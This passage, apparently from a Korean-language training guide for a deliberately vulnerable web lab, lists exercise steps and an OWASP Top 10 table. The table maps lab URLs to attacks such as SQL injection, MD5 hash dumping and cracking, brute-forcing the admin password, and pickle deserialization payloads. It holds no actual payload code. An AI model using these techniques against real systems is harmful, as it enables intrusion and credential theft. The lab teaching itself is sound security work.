6.  A01-1: /vulnlab/crypto3 → 파일 IDOR 확인
7.  A04-1: Burp 설정 → /complaints/new 제출 → plaintext 패킷
8.  A05-1: /vulnlab/a05 → SQL Injection 페이로드 실행
9.  A04-2: /vulnlab/crypto2 → SQLi + MD5 덤프 → 온라인 크래킹
10. A06-1: /vulnlab/a06 → Rate Limit 없음 + 상태 전이 변조
11. A07-1: brute_force.py → admin 비밀번호 발견
12. A08-1: /vulnlab/a08 → Pickle 페이로드 생성 → 역직렬화
13. A09-1: /vulnlab/a09 → 평문 로그 기록 확인
14. A03-1: /vulnlab/a03 → 취약 패키지 스캔
```

---

## 전체 시나리오 요약

| OWASP | 시나리오 | 실습 URL |
|-------|----------|----------|
| A01 | 파일 다운로드 IDOR | `/vulnlab/crypto3` |
| A01 | 인증 체크 누락 | `/vulnlab/auth3/user-list` |
| A02 | 기본 계정 + 설정 정보 노출 | `/vulnlab/a02` |
| A03 | 취약 패키지 스캔 | `/vulnlab/a03` |
| A04 | HTTP 전송 평문 노출 | `/complaints/new` + Burp |
| A04+A05 | MD5 비밀번호 + SQLi 탈취 | `/vulnlab/crypto2` |
| A05 | SQL Injection | `/vulnlab/a05` |
| A06 | Rate Limiting 부재 + 상태 전이 무검증 | `/vulnlab/a06` |
| A07 | 브루트포스 – 계정 잠금 없음 | `/login` |
| A07 | 순차 세션 ID 추측 | `/vulnlab/auth2` |
| A08 | Pickle 역직렬화 | `/vulnlab/a08` |
| A09 | 평문 로깅 + 알림 부재 | `/vulnlab/a09` |
| A10 | Fail-Open + Traceback 노출 | `/vulnlab/a10` |

---

*이 문서는 교육/실습 목적으로 작성되었습니다. 외부 시스템에 동일 기법을 적용하는 것은 불법입니다.*
